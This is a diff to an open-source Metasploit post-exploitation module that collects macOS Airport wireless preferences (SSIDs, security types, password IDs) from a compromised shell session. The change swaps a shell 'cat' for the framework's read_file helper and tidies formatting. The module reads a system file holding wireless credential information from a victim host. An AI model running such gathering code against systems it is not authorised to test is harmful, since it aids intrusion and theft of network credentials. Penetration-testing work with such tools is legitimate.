@@ -7,6 +7,8 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Post
 
+  include Msf::Post::File
+
   def initialize(info={})
     super(update_info(info,
       'Name'          => 'OS X Gather Airport Wireless Preferences',
@@ -16,7 +18,7 @@ class Metasploit3 < Msf::Post
         SSID, Channels, Security Type, Password ID, etc.
       },
       'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
+      'Author'        => [ 'sinn3r' ],
       'Platform'      => [ 'osx' ],
       'SessionTypes'  => [ "shell" ]
     ))
@@ -43,7 +45,7 @@ class Metasploit3 < Msf::Post
 
 
   def get_air_preferences
-    pref = exec("cat /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist")
+    pref = read_file("/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist")
     return pref =~ /No such file or directory/ ? nil : pref
   end
 
